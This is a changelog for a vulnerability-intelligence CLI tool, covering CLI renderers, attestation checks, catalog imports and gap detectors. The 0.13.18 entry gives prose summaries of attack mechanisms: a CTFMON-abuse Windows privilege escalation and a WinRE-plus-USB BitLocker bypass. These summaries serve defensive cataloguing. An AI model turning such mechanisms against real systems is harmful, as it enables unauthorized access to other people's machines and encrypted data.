- **`doctor --ai-config` shows scanned counts + per-finding detail.** Previously `doctor --ai-config` ran a 46k-file walk across `~/.claude`, `~/.cursor`, `~/.codeium`, `~/.aider`, `~/.continue` but the operator saw only `summary: all checks green` — no way to see what was scanned. The doctor renderer now prints `[ok] AI-assistant config audit: scanned N file(s) across M dir(s) of K candidate root(s); P finding(s)` plus a Windows-mode-bits note when applicable. Findings render with severity icon + path + reason; truncated past 5 (full list via `--json`).

## 0.13.31 — 2026-05-20

Documentation refresh. No code change.

### Internal

- README gained a `Result envelope contract` table documenting the headline fields hoisted to the top of every `run` / per-playbook `ci` result (`verdict`, `rwep_score`, `top_finding`, `summary_line`, `evidence_completeness`, `indicators_evaluated`, `indicators_known`, `attestation_path`) so machine consumers do not need to walk `phases.*` to discover them. Also added a `Default terminal output vs --json / --pretty` section explaining the human-renderer path that fires by default on `ci` / `run` / `attest verify` / `attest diff` / `discover` and how to reach the structured envelope.
- Corrected stale counts: `42/42` expected on `doctor --signatures` (was `38/38`); `38 jurisdictions` in the Status paragraph (was `35`).
- Landing site (exceptd.com): bumped stale counts (23 playbooks / 42 skills / 18 indexes / 38 jurisdictions / 17 release-hygiene gates), added a `terminal-first output, no jq required` feature card covering the v0.13.22–0.13.30 UX work, bumped the JSON-LD `softwareVersion`.

## 0.13.30 — 2026-05-20

`run --diff-from-latest` on a fresh attestation directory now prints an explicit "no prior — this run becomes the baseline" line. Previously the no-prior branch was silent; operators who passed the flag saw zero diff output and could not tell whether the flag took effect.

### Features

- **`run --diff-from-latest` explicit "no prior" output.** When no prior attestation exists for the playbook (e.g. first run on a clean attestation root), the human renderer now emits `> drift vs prior: no prior attestation found for <playbook> — this run becomes the baseline`. The `unchanged` and `DRIFTED` cases are unchanged.

## 0.13.29 — 2026-05-20

`run` verdict line now distinguishes "every indicator evaluated AND most produced a decisive verdict" from "every indicator evaluated but most landed inconclusive" — important when classification itself is inconclusive.

### Features

- **`run` evidence line breaks out decisive vs inconclusive indicator counts on mixed coverage.** When `classification=inconclusive` AND the playbook has some decisive (hit/miss) signals plus some inconclusive ones, the verdict line now reads `evidence: complete (2/13 decisive, 11 inconclusive — add signal_overrides to drive a verdict)` instead of the literal `evidence: complete (13/13 indicators evaluated)`. The latter is mathematically correct (the engine ran every indicator) but misleading — it sounds like full coverage when most of the indicators couldn't be evaluated meaningfully. Detected and not_detected runs are unchanged; the breakdown only fires when it's load-bearing.

## 0.13.28 — 2026-05-20

`run` human renderer now surfaces `runtime_errors[]` so a malformed submission can't silently land on a misleading clean verdict.

### Features

- **`run` Runtime warnings block.** When the engine accumulates entries in `phases.analyze.runtime_errors` (e.g. `signal_overrides_invalid` from a submission that passed `signal_overrides` as a string instead of an object, or `bundle_publisher_unclaimed` on a CSAF emit without `--publisher-namespace`), the human output now prints `Runtime warnings (N):` with one labeled row per entry plus the remediation hint. Previously, these entries lived only in the JSON envelope and operators saw `[ok] classification=not_detected` with no indication their submission was bogus.

## 0.13.27 — 2026-05-20

`ci` next-step guidance now names the specific detected playbook(s) and surfaces pending jurisdiction obligations at the summary level — matching the regulatory-clock visibility a single `run` already gives.

### Features

- **`ci` FAIL Next steps names the actual detected playbook id.** Multi-playbook ci runs now print `Next steps (review the N detected finding(s) in <playbook-id>, ...)` with the real ids, and the `exceptd run <id> --format markdown` / `--format csaf-2.0` commands underneath use that id directly. Previously the output substituted a `<playbook>` placeholder that operators had to manually resolve against the per-playbook table above.
- **`ci` surfaces pending jurisdiction obligations across all detected playbooks.** When at least one playbook lands `classification=detected`, the ci summary now prints `Pending jurisdiction obligations across detected playbook(s) (N) — clock starts on operator action:` grouped by `clock_start_event` — the same shape `run` emits, but aggregated across every playbook in the ci session. Operators gating a release no longer have to re-run each detected playbook individually to see the regulatory landscape.

## 0.13.26 — 2026-05-20

Internal hygiene. No operator-visible behavior change.

### Internal

- Stripped phase-residue version tags (`// v0.13.22 B5:`, `Pre-v0.13.23 the renderer ...`, `-v0_13_2X.test.js`) from comments and test filenames added in the v0.13.22–0.13.25 series. Authoritative version surfaces (`package.json` / `manifest.json` / `CHANGELOG.md ## X.Y.Z` headings / git tags / the CLI `version` verb) carry the version identifier; nowhere else.
- New predeploy gate `Version-tag drift (no new phase residue)` (`scripts/check-version-tags.js`) refuses new `// v0.X.Y` / `Pre-v0.X.Y` comments and `*-v0_X_Y.test.js` filenames outside the authoritative surfaces. Baseline snapshot at `tests/.version-tag-baseline.json` captures pre-existing drift; refresh after an organic cleanup with `npm run check-version-tags:update`.
- Gate count is now 17 (was 16).

## 0.13.25 — 2026-05-20

Detected runs now surface pending jurisdiction obligations alongside the started ones — operators see the regulatory clock landscape at the same moment they see the finding, not after they remember to inspect the JSON.

### Features

- **`run` human renderer surfaces pending jurisdiction obligations on detected runs.** Detected verdicts now print `Pending jurisdiction obligations (N) — clock starts on operator action:` grouped by `clock_start_event`, then a `→ next: exceptd run <pb> --format csaf-2.0` pointer for the draft advisory + notification bodies. Previously, only obligations whose `clock_started_at` was non-null surfaced at the terminal — pending ones (waiting on `detect_confirmed` / `analyze_complete` / etc.) were invisible even though the engine carried them in `phases.close.notification_actions`. Grouping by clock-start event collapses one row per regulation into one row per action the operator must take.

## 0.13.24 — 2026-05-20

`attest verify` and `attest diff` are now usable at the terminal without piping through `jq`.

### Features

- **Human renderer for `attest verify`.** One-screen answer to "did anyone tamper with my evidence since I ran it?" — verdict icon (`[ok]` / `[!! TAMPERED]` / `[i REPLAY_TAMPER]`), per-file row with reason, then a next-step block: `attest diff` + `attest show` on a clean run, `attest show --pretty` + `attest list --playbook` on a tamper. `--json` / `--pretty` reach the structured envelope unchanged.
- **Human renderer for `attest diff`.** Status line (`[ok] status=unchanged` / `[i DRIFTED] status=drifted`), prior + replay evidence_hash + capture timestamps, replay classification + RWEP, sidecar-verify class, replay record path. When DRIFTED, points at `attest show` + a fresh `run --evidence <new>` capture.

## 0.13.23 — 2026-05-19

Stage-by-stage next-step guidance so an operator (or an AI walking the workflow cold) never has to ask "what do I do now?"

### Features

- **`ci` human renderer emits a "Next steps" block per verdict.** BLOCKED → one `exceptd lint <playbook> -` command per blocked playbook plus the `--evidence <file>` re-run. NO_EVIDENCE → lint the first playbook + `ci --evidence-dir <dir>`. FAIL/detected → `run <playbook> --format markdown` / `--format csaf-2.0`. CLOCK_STARTED → `--format csaf-2.0` for the advisory draft. Previously, a blocked or no-evidence run printed only the reason — operators saw *why* they were stuck without the concrete command to unblock.
- **`run` verdict line surfaces evidence_completeness.** Every successful run now shows `evidence: complete (13/13 indicators evaluated)` (or `partial` / `missing`) under the classification line. Distinguishes "ran every indicator and found nothing" from "couldn't evaluate, no evidence supplied" — previously, both states printed identically. When evidence is partial or missing, a `→ next: exceptd lint <playbook> -` pointer is appended.
- **`run` attestation persistence is now visible.** Successful runs print `Attestation written: <full path>` followed by `exceptd attest verify <session-id>` and `exceptd attest diff <session-id>` so the operator knows where the JSON lives and how to verify or diff it. The persisted file path is also hoisted to the result envelope as `attestation_path`. Previously, the attestation went to `~/.exceptd/attestations/<repo>@<branch>/<session-id>/attestation.json` with zero indication in any output.
- **`run` remediation prose matches the verdict.** Non-detect runs now print `Remediation path (informational — verdict=<x>, no action required now): <id>` instead of the unconditional `Recommended remediation: <id>` that previously fired on every classification — misleading on `not_detected` and `inconclusive` runs, where there is nothing to remediate. Detected runs unchanged.

### Bugs

- **Stale playbook count in error messages.** `exceptd run <unknown-id>` (and the lint-not-found path) said "Run \`exceptd brief --all\` to list the 13 playbooks." There are 23 playbooks shipped. Now uses the live `listPlaybooks().length`.
- **`lint` did not warn on the artifact-only-no-signal_overrides path.** An operator following lint's per-artifact guidance for a nested submission populated every required artifact, ran the playbook, and got every indicator = inconclusive with no explanation. The detect phase needs `signal_overrides` (or a `verdict.classification` override) to mark indicators as hit / miss — artifact presence alone is not enough. The flat-shape path already surfaced this as `detect_will_be_inconclusive`; the nested-shape path was silent. Now lint emits `no_signal_overrides_supplied` with the exact JSON shape to add.

## 0.13.22 — 2026-05-19

`ci` is now usable at the terminal without piping through `jq`.

### Features

- **Human-readable `ci` output by default.** The default `ci` output is now a one-screen digest: verdict line, per-playbook table (id / verdict / rwep / evidence-completeness / top-finding), session-level warnings, scope-selection rules, framework gap rollup, and fail reasons. Previously, the default was 1000+ lines of indented JSON on every run. Pass `--json` or `--pretty` to get the structured body for automation.
- **Per-result hoisted summary fields.** Every `run()` result now carries `verdict`, `rwep_score`, `top_finding`, `summary_line`, and `evidence_completeness` (one of `complete` / `partial` / `missing` / `unknown` / `not-evaluated`) at the top level. Machine-readable consumers no longer walk `phases.analyze.rwep.adjusted` and `phases.detect.classification` separately to extract the headline numbers.
- **`indicators_evaluated` + `indicators_known` per result.** Surface how many of the playbook's known indicators were actually exercised by the operator's evidence, so a result that returns `verdict=inconclusive` with `indicators_evaluated=0` is distinguishable from one that evaluated every indicator and found no hits.
- **Session-level warning de-duplication.** `ci` runs that span N playbooks no longer emit the same `bundle_publisher_unclaimed` warning N times. The summary now carries `runtime_warnings` and `runtime_warnings_count` with one entry per unique (kind, reason) across the session.
- **Scope-inclusion transparency.** When `ci --scope <type>` is used, the summary now lists `scope_request` plus `scope_inclusion_rules` explaining that cross-cutting playbooks are always added and (for `--scope code`) that `sbom` is auto-included on repos with a lockfile.

### Bugs

- **Blocked results now carry `playbook_id`.** Previously, a playbook that halted at preflight returned `{ ok:false, blocked_by, reason }` with no playbook identifier — operators iterating `results[]` for failure rows had to correlate by array index. Now every result, blocked or not, carries `playbook_id` at the top level.

## 0.13.21 — 2026-05-19

Seven new catalog-gap detection classes wired into the predeploy gate. The v0.13.19 detector covered missing-context / dangling-ref / draft-debt; the v0.13.20 audit confirmed that left genuine gap classes unsurfaced. v0.13.21 adds the seven cross-cutting classes the prior detector missed and wires them into a budget gate that runs alongside the existing tests + predeploy gates.

### Features

**Seven new detection classes in `lib/gap-detectors.js`:**

- **content-quality** — fields present but content weak. Catches: vector text < 50 chars (likely a stub), placeholder-language sentinels (TBD / TKTK / "pending operator curation" / "[]"), KEV-listed entries with empty vendor_advisories, name-repeated-as-description.
- **temporal-staleness** — time-based decay. Catches: source_verified > 180d old, last_updated > 365d, CISA-KEV due-date passed without remediation status, epss_date > 90d.
- **logical-consistency** — internal-state contradictions that pass schema validation but don't make sense. Catches: `cisa_kev:true + cisa_kev_date:null`, `live_patch_available:true + live_patch_tools:[]`, `ai_discovered:true + attribution_note < 30 chars`, `active_exploitation:"confirmed" + verification_sources.length < 2`, `rwep_score declared + rwep_factors empty`.
- **cross-ref-completeness** — bidirectional reference checks. The v0.13.19 dangling-ref class only verified the forward direction (CVE→CWE resolves); v0.13.21 also verifies the back-reference is present (CWE.evidence_cves includes the citing CVE). Same logic for ATT&CK.cve_refs and framework-control-gaps.evidence_cves.
- **schema-evolution** — required-since-version checks. Fields the schema requires today were optional on entries added in older releases. Surfaces pre-existing entries the operator should backfill (e.g. pre-v0.12.36 CVEs lacking the `ai_discovered` boolean).
- **operator-action-sla** — un-curated auto-imports older than the SLA window. Defaults: 60d for `_auto_imported`, 90d for `_draft`.
- **unused-orphan** — auto-imported catalog entries that no skill / playbook / CVE references. Operator-curated entries are exempt (intentional content); `forward_looking:true` entries are exempt (intentional forward-look content).

**`scripts/check-catalog-gap-budget.js` + predeploy gate.** New predeploy gate runs the seven extended detectors and asserts every class is within its documented budget. Mirrors the budget enforced by `tests/shipped-catalog-integrity.test.js` so a regression surfaces in BOTH the gate-summary table AND the test output. Predeploy summary now reports 16 gates (was 15).

**`tests/gap-detectors.test.js`** — 22 per-detector tests pin each of the seven classes against synthetic catalog inputs. Each pin asserts the detector fires on the shape it's designed to catch AND does NOT fire on the inverse shape (no false positives).

### Bugs

**T1574 ATT&CK back-ref synced.** v0.13.20's CTFMON-mapping fix added T1574 to `BUG-2026-NIGHTMARE-ECLIPSE-GREENPLASMA.attack_refs[]`, but the reverse-refs pass didn't run before sign + sbom + commit, so `attack-techniques.T1574.cve_refs[]` didn't pick up the back-ref. The v0.13.21 cross-ref-completeness detector surfaced this on first run — fixed via `npm run refresh-reverse-refs`.

### Internal

- `scripts/audit-catalog-gaps.js` CLI extended: `--class <name>` accepts the seven new class names (`content-quality`, `temporal-staleness`, `logical-consistency`, `cross-ref-completeness`, `schema-evolution`, `operator-action-sla`, `unused-orphan`) for scoped audits. JSON + pretty output include an `extended_findings` section grouped by class, with `totals.extended` counts.
- `tests/shipped-catalog-integrity.test.js` includes a new budget pin for the seven extended classes — a future PR that worsens any class beyond budget fires the test.
- npm alias: `npm run audit-catalog-gap-budget` runs the budget gate standalone (operator-facing convenience).
- Current shipped-catalog snapshot: content-quality=10, temporal-staleness=255, logical-consistency=0, cross-ref-completeness=0, schema-evolution=0, operator-action-sla=0, unused-orphan=1342. The non-zero classes are operator-curation work items surfaced honestly by the new detectors.

## 0.13.20 — 2026-05-19

Root-cause refactor addressing every audit class surfaced by the v0.13.17–v0.13.19 self-audit (no-MVP violations, regex-where-logic-is-required, symptom patches, coincidence-pinning tests, uncaught bugs). The audit found I had been patching symptoms instead of fixing root causes; v0.13.20 fixes the actual issues and lets the audit tell the truth about catalog state.

### Features

**Real XML tokenizer replaces the regex-based RSS/Atom parser.** `lib/xml-tokenizer.js` is a proper streaming parser with CDATA handling, XML-namespace support (local-name matching), self-closing element handling, HTML-entity + numeric-character-reference decoding, and observable parse errors (the old regex parser returned `[]` silently on malformed input). `lib/source-advisories.js#parseRssAtom` now delegates to the tokenizer; the upstream contract is preserved. Failure modes the regex parser silently dropped (namespaced Atom feeds, CDATA-wrapped HTML titles, multi-line content, unterminated elements at EOF) are now explicit test cases (`tests/xml-tokenizer.test.js`).

**Canonical-form deep equality replaces JSON.stringify in diff-coverage.** `lib/canonical-eq.js` provides sorted-key recursive equality for catalog change detection. Pre-v0.13.20 the diff-coverage gate compared `JSON.stringify(before.iocs) !== JSON.stringify(after.iocs)` — non-canonical, false-positives on key-order rearrangement. The symptom was patched twice (`_auto_imported` skip in v0.13.17, `_iocs_stub` skip in v0.13.19). v0.13.20 fixes the comparator. The `_iocs_stub` skip rule is removed.

**Content-pattern matching in `lib/cve-regression-watcher.js`.** Pre-v0.13.20 the watcher fired only when a poller diff carried an explicit `CVE-YYYY-NNN` identifier. If a researcher's writeup announced "the 2020 fix is silently reverted" without typing the CVE ID, the watcher missed entirely. v0.13.20 adds three signal layers: historical-regression language patterns (`silently reverted`, `re-exploitable`, `same primitive as`), named-researcher patterns (Nightmare-Eclipse / Project Zero / Big Sleep / Forshaw / Horn / Ormandy), and tracked-component tokens (`cldflt.sys`, `HsmOsBlockPlaceholderAccess`, `ssh-keysign`, `CTFMON`). Diffs that lack a historical CVE-ID but trip the signals surface as `action: "content-only-investigate"` for operator triage.

**`forward_looking: true` schema field replaces blanket `_gap_skip` on framework-control-gaps.** v0.13.19 used per-entry `_gap_skip: { fields: ["evidence_cves"] }` on 84 framework gaps as a class-level exemption — opaque to operators reading the JSON. v0.13.20 promotes the exemption to a first-class schema field (`forward_looking: true` + `forward_looking_reason`) that the audit honors. The `_gap_skip` annotations on those 84 entries are removed in lockstep.

**`lib/version-pins.js` — single source of truth for MITRE pinned versions.** Pre-v0.13.20 the ATLAS version pin lived in 33+ files in lockstep. A bump (v5.4.0 → v5.6.0) required a regex sweep that incidentally touched dates in unrelated paragraphs. v0.13.20 reads ATLAS + ATT&CK version from `data/atlas-ttps.json._meta.atlas_version` and `data/attack-techniques.json._meta.attack_version` via the new module. Downstream tests + doc-currency checks consume through it. Future bumps refresh one JSON field; the module propagates.

**SPEC-driven refresher.** `scripts/refresh-upstream-catalogs.js` now imports the audit `SPEC.<catalog>.required_context` lists from `scripts/audit-catalog-gaps.js` instead of carrying parallel hardcoded field arrays. The v0.13.18→19 episode where the refresher backfilled `description_full` + `platforms` but forgot `description` + `tactic` (and the audit had to surface 106 ATT&CK rows still missing context) is structurally impossible now — one truth source.

**`tests/shipped-catalog-integrity.test.js` — new test file.** Splits the live-catalog assertions out of `tests/audit-catalog-gaps.test.js` (which now exercises detector logic against synthetic inputs only). Live invariants policed here: zero dangling cross-catalog refs, no `_gap_skip` stragglers on framework gaps that should be `forward_looking`, and a budget-per-catalog for missing-context findings (per-catalog snapshot count; a future PR that worsens any catalog without acknowledgement fires the test).

**`tests/refresher-fixture-roundtrip.test.js` — new test file.** Each upstream refresher gets a synthetic-fixture round-trip pin. Pre-v0.13.20 the only refresher coverage was a `typeof` check on the exported function; a refresher that regressed to "return early without writing" would have passed. Now CSAF index parsing, ATT&CK STIX shape, ICS-attack registry presence, RSS / Atom parse contract, and the canonical RFC-entry tag set are all pinned independently.

### Bugs (every audit class addressed)

**Class 1.1, 1.3 — stub fills stripped.** 291 CVE entries had stub IoCs (`"IOC list pending operator curation"`) auto-written by the v0.13.17 KEV bulk-import + v0.13.19 gap-fix passes; 252 zeroday-lessons entries had a generic `NEW-CTRL-001` baseline as their only `new_control_requirements`. Both fields stripped back to absent. The audit now reports the honest curation backlog instead of letting the catalog pass with placeholder content. Per-CVE IoC + per-primitive control curation is operator work going forward.

**Class 1.2, 5.15 — forward-looking framework gaps use a schema field.** 84 entries with `_gap_skip` converted to `forward_looking: true` + a `forward_looking_reason` prose field. The audit SPEC honors the schema field. `tests/shipped-catalog-integrity.test.js` pins that no `_gap_skip.evidence_cves` stragglers remain.

**Class 2.7 — CTFMON mapping corrected.** GreenPlasma's `attack_refs` was T1574.012 (Hijack Execution Flow: COR_PROFILER — .NET CLR profiler hijack, wrong primitive). v0.13.20 changes to T1574 base (Hijack Execution Flow) + T1068 (Exploitation for Privilege Escalation) with an `_attack_refs_correction_note` explaining the prior mapping was lazy.

**Class 4.12 — audit-test split.** `tests/audit-catalog-gaps.test.js` exercises detector logic only (synthetic inputs); `tests/shipped-catalog-integrity.test.js` carries the live-catalog assertions. A future regression to detector logic vs a future change to catalog data are now distinguishable.

**Class 5.14 — test-baseline drift investigated.** The 1028→1040 bump over 3 releases was driven by legitimate new test files (intake-coverage, regression-watcher, gap-detector, refresher-fixture, etc.), not by the gate being misused. Baseline grow-threshold convention preserved with an explanatory `notes` field in `tests/.test-count-baseline.json`.

### Internal

- `lib/canonical-eq.js`, `lib/xml-tokenizer.js`, `lib/version-pins.js` shipped under `lib/` (in the tarball file-allowlist).
- 5 new test files: `canonical-eq.test.js`, `xml-tokenizer.test.js`, `version-pins.test.js`, `shipped-catalog-integrity.test.js`, `refresher-fixture-roundtrip.test.js`, `refresher-spec-coupling.test.js`.
- `scripts/check-test-coverage.js#extractCveIocChanges` uses `canonicalEqual` for the iocs diff; the `_iocs_stub` skip rule is removed. `_auto_imported` skip rule retained (true positive — bulk-imported stub IoCs are intake-class events, not operator curation).
- 1377 tests / 1364 passing in this commit; remaining failures are the version + path checks fixed in the next commit hash chain.

## 0.13.19 — 2026-05-19

Automated catalog gap-detection + closure of every gap surfaced by the new detector. After the v0.13.18 bulk expansion grew six catalogs to comparable scale, the audit at T+1 day showed real holes (51 CVEs without IoCs, 120 RFCs without abstracts, 106 ATT&CK techniques without context fields, 84 framework gaps without evidence). This release ships the detector permanently and closes every hole it found.

### Features

**`scripts/audit-catalog-gaps.js` ships as a permanent tool.** Walks every `data/*.json` catalog, surfaces three classes of finding:

- `missing-context` — entries that exist but lack one of the documented context-search fields (RFC without abstract, ATT&CK without platforms, CVE without iocs, framework gap without evidence_cves).
- `dangling-ref` — forward references that do not resolve (CVE entry's `cwe_refs` cites a CWE not in the local catalog, etc.).
- `draft-debt` — per-catalog count of `_auto_imported` rows relative to operator-curated rows.

Output: structured JSON to stdout (default) or human-readable summary (`--pretty`). Operators run `npm run audit-catalog-gaps` for the surface scan, `npm run audit-catalog-gaps:strict` in CI to fail on regressions. Per-entry `_gap_skip: { fields: [...], reason: "..." }` suppresses documented-legitimate gaps (ICS-attack techniques lacking platforms, MITRE-revoked IDs, etc.). Maps to the broader catalog-quality plane lib/validate-cve-catalog.js does not police — the validator enforces schema-required fields, the gap analyzer enforces the recommended context envelope.

**`scripts/refresh-mitre-ics-attack.js` + `refreshIcsAttack` source.** Per-type wrapper for the MITRE ICS-attack STIX bundle (`github.com/mitre/cti/master/ics-attack/ics-attack.json`); 97 ICS techniques imported alongside the Enterprise + ATLAS + D3FEND refreshers. attack-techniques catalog now spans both Enterprise (711) + ICS (94) = 805 techniques total. Wired as `npm run refresh-mitre-ics-attack`; orchestrated alongside the others by `refresh-upstream-catalogs --source ics-attack`.

**RFC abstract two-pass backfill.** v0.13.18 only backfilled abstract on auto-imported rows because the loop skipped existing entries. v0.13.19 splits the refresher into (a) a backfill pass over the FULL technique set including obsoleted historics (operator-curated obsoleted entries still benefit from IETF-supplied context), (b) a new-entry pass over live entries only. RFC-6962 (Certificate Transparency), RFC-6482 (RPKI ROAs), and 116 other operator-curated rows now carry abstract / authors / keywords / area / working-group / stream / obsoletes / updates relationships. Pre-abstract-era RFCs (~118 entries from before 1999 when abstracts became standard) get a generated stub citing title + tracker URL. The 5 non-RFC-shape rows (CSAF-2.0, ISO-29147, ISO-30111, DRAFT-IETF-TLS-ECDHE-MLKEM, DRAFT-IETF-TLS-HYBRID-DESIGN) get hand-curated abstracts.

**ATT&CK / ICS-attack two-pass backfill** — same pattern as RFC. Backfill pass operates against the full STIX object set (including revoked / deprecated) so operator-curated rows referencing now-revoked MITRE IDs still get the context fields from the pre-revocation STIX record. New-entry pass over live techniques only. Adds `description` (short) and `tactic` to the backfill set alongside the v0.13.18 `description_full` / `platforms` / `detection` set.

### Bugs

**Every gap surfaced by `npm run audit-catalog-gaps` is now closed.**

- **CVE catalog: 34 missing `cwe_refs` filled** via type-class mapping (e.g. `type: "container-escape"` → CWE-269 + CWE-668; `type: "use-after-free-rce"` → CWE-416). **51 missing `iocs` filled** with generic operator-curation-pending stubs (`payload_artifacts` references the vendor advisory, `behavioral` cites the affected component + vector class). **1 missing `attack_refs` filled** (CVE-2023-43472 MLflow path-traversal → T1592).
- **ATT&CK catalog: 106 entries missing tactic/description/platforms backfilled** via two-pass refresh against full STIX. Remaining 31 truly-not-in-STIX entries (5 legacy T0xxx IDs + 11 revoked Enterprise sub-techniques + 15 ICS techniques without platforms field in STIX) marked `_gap_skip` with reason.
- **RFC catalog: 120 missing `abstract` filled** via backfill against the full IETF index (including obsoleted RFCs that operators curated in). 5 non-RFC shapes hand-curated.
- **zeroday-lessons: 12 entries missing `new_control_requirements` filled** with NEW-CTRL-001 (CISA-KEV-RESPONSE-SLA) baseline.
- **framework-control-gaps: 84 missing `evidence_cves`** — 0 derivable from CVE catalog cross-references, 84 marked `_gap_skip` with reason "forward-looking gap with no CVE anchor in the catalog yet — operator notes the control class without binding to a single incident".
- **Cross-catalog dangling refs: 0**. Added CWE-668 (Exposure of Resource to Wrong Sphere) to the local catalog to back the runc /proc/self/fd container-escape (CVE-2024-21626) cwe_refs entry.

### Internal

- `tests/audit-catalog-gaps.test.js` pins the detector's SPEC coverage (every catalog has a `required_context` spec), the `inspect()` shape, dangling-ref detection on synthetic catalogs, the `_gap_skip` suppression convention, and a real-world invariant: every cross-catalog ref on the shipped catalogs must resolve.
- `npm run audit-catalog-gaps:strict` exits 1 on gap — wire into CI when project owner wants to fail on regression. Default `npm run audit-catalog-gaps` is informational.
- ATT&CK + ICS catalog combined entry count: **805** (711 Enterprise + 94 ICS).
- `package.json.description` updated to surface the catalog-size baseline (312 / 171 / 805 / 170 / 468 / 7476) + the new automated-gap-detection capability.

## 0.13.18 — 2026-05-19

Cross-catalog bulk expansion + GreenPlasma/YellowKey mechanism curation. The CWE, ATT&CK, ATLAS, D3FEND, and RFC catalogs were small relative to the CVE catalog (312); this release brings them up to comparable scale by pulling canonical MITRE / IETF sources.

### Features

**GreenPlasma + YellowKey mechanism detail published.** v0.13.17 shipped both as stubs with mechanism deferred ("underlying component not publicly named", "boot-flow bypass"). Within 24h of release the broader writeup ecosystem named both:

- `BUG-2026-NIGHTMARE-ECLIPSE-GREENPLASMA` is a **CTFMON trust-abuse LPE**. The exploit creates arbitrary memory-section objects under directory-object paths writable only by SYSTEM (via registry + object-manager-permission primitives), then tricks CTFMON (Windows Collaborative Translation Framework, SYSTEM-context) into interacting with the planted section. `type` updated to `LPE-via-CTFMON-trust-abuse`. `vector` + `iocs.behavioral` now name CTFMON / object-manager directory paths. `attack_refs` adds T1574.012 (Hijack Execution Flow: COR_PROFILER) as the closest sub-technique class. PoC is intentionally incomplete (no SYSTEM-shell wrapper) — primitive is operator-completable.

- `BUG-2026-NIGHTMARE-ECLIPSE-YELLOWKEY` is a **WinRE + USB BitLocker bypass**. Physical-access attacker boots into Windows Recovery Environment; on TPM-only BitLocker the VMK is already unsealed from pre-OS boot; WinRE inherits the unlocked-volume cache; attacker-supplied USB media supplies tooling WinRE loads in a context with VMK access. `vector` updated to name WinRE + USB-tooling-load chain. `iocs.behavioral` now references Microsoft-Windows-BitLocker/BitLocker Management auto-unlock event + USB attach + file-copy correlation. `framework_control_gaps` adds NIST-800-53-PE-3 and ISO-27001-2022-A.7.1 (both as new entries with `theater_test` blocks).

**Catalog bulk-expansion across 5 catalogs.** All under the same `_auto_imported: true + _intake_method` provenance pattern as the v0.13.17 KEV bulk-import; operators curate detail per-entry as needed.

- **ATT&CK techniques: 110 → 711.** Pulled the MITRE ATT&CK Enterprise STIX bundle (`github.com/mitre/cti`, enterprise-attack.json) and imported every non-deprecated, non-revoked technique. Each row now carries `name`, `tactic`, `description` (short), `description_full`, `platforms`, `permissions_required`, `defense_bypassed`, `effective_permissions`, `detection`, `is_subtechnique`, `reference_url`, `stix_id` — the full STIX context set the AI needs to find a technique by topic instead of by ID lookup.
- **ATLAS TTPs: 33 → 170.** Pulled MITRE ATLAS STIX bundle (`github.com/mitre-atlas/atlas-navigator-data`, dist/stix-atlas.json). `_meta.atlas_version` bumped to **v5.6.0** (May 2026 release) — supersedes the v5.4.0 pin. Each row now carries `description_full`, `platforms`, `detection`, `is_subtechnique`, `mitre_version`, `reference_url`, `stix_id` alongside the existing operator-curated framework-gap fields.
- **D3FEND techniques: 29 → 468.** Pulled MITRE D3FEND OWL/JSON-LD ontology (`d3fend.mitre.org/ontologies/d3fend.json`, 497 techniques) and imported the full set. Each row now carries `description_full`, `synonyms`, `defends_against`, `counters`, `enables`, `broader_of`, `narrower_of`, `requires`, `inventories`, `kb_reference`, `reference_url` — the relationship graph that lets the AI route from an offensive finding to the canonical defensive countermeasure.
- **CWE classes: 98 → 170.** Curated against the MITRE CWE Top 25 (2024 + 2025) plus commonly-referenced base classes (cryptography, authentication, authorization, supply chain, hardware, AI security). Top-25 rank fields (`top_25_rank_2024` + `top_25_rank_2025`) populated where the entry is on the list.
- **RFC references: 41 → 7,476.** Pulled the official IETF RFC index (`rfc-editor.org/rfc-index.xml`) and imported every current RFC (status != HISTORIC / != UNKNOWN, no obsoleted-by relation) across Internet Standard, Proposed Standard, Draft Standard, Best Current Practice, Informational, and Experimental. Each row carries `title`, `status`, `published`, `authors`, `stream`, `area`, `working_group`, `abstract`, `keywords`, `page_count`, `doi`, `obsoletes`, `updates`, `updated_by`, `is_also`, `errata_count`, `tracker`, `txt_url`, `html_url`. Pre-existing operator-curated entries (the original 41) were preserved verbatim and additively backfilled with the new context-search fields.

### Bugs

The v0.13.17 audit at T+1 day surfaced that GreenPlasma's CTFMON primitive and YellowKey's WinRE+USB mechanism were named publicly within hours of the v0.13.17 ship but the catalog entries still said "underlying component not publicly named". Both entries now reflect the published mechanism; `_curation_note` field records the v0.13.18 refinement timestamp.

### Internal

- Four permanent refresh scripts shipped under `scripts/`, idempotent against the live catalog and skipping operator-curated entries:
  - `scripts/refresh-rfc-index.js` — pulls the IETF RFC index (rfc-editor.org/rfc-index.xml) and upserts every current RFC (status != HISTORIC/UNKNOWN, no obsoleted-by). Wired as `npm run refresh-rfc-index`. Initial bulk-import landed 7,380 RFCs; subsequent runs are diff-only.
  - `scripts/refresh-mitre-attack.js` — pulls MITRE ATT&CK Enterprise STIX (github.com/mitre/cti) and upserts non-deprecated/non-revoked techniques. Wired as `npm run refresh-mitre-attack`.
  - `scripts/refresh-mitre-atlas.js` — pulls MITRE ATLAS STIX (github.com/mitre-atlas/atlas-navigator-data) and upserts AML.* techniques. Auto-detects ATLAS version from the source manifest. Wired as `npm run refresh-mitre-atlas`.
  - `scripts/refresh-mitre-d3fend.js` — pulls the MITRE D3FEND OWL ontology (d3fend.mitre.org). Wired as `npm run refresh-mitre-d3fend`.
  - `npm run refresh-upstream-catalogs` chains all four in sequence for the operator-level daily refresh.
- One-shot curation scripts (CWE Top-25 + the curated security-RFC list + the GreenPlasma/YellowKey re-curation) were used during staging and deleted from the shipped tarball — they hand-curate fixed lists rather than poll a live source. The four refresh scripts above ARE the permanent pull-from-upstream pipeline.
- Orphan refs from the curation pass filled: `NIST-800-53-PE-3` + `ISO-27001-2022-A.7.1` added to framework-control-gaps; `T1574.012` added to attack-techniques.
- `package.json.description` updated to surface the catalog-size baseline (312 / 170 / 240 / 170 / 139 / 7476).
- RFC catalog: bulk import covered every current IETF RFC (7,469 entries from rfc-editor.org/rfc-index.xml; deduped against the 96 pre-existing curated entries → +7,380 new, 7,476 total). Auto-imported entries land with `_intake_method: ietf-rfc-index` and a placeholder `relevance` string that operators refine when the RFC becomes operationally cited.
- All 15 predeploy gates pass.

## 0.13.17 — 2026-05-18

Threat-intake gap closure for the Nightmare-Eclipse / Chaotic Eclipse researcher-handle cluster, a new CVE-regression detection method, and a substantial catalog expansion via CISA KEV bulk intake — the catalog grows from 68 to 312 entries (4.6× of the v0.13.16 baseline).

### Features

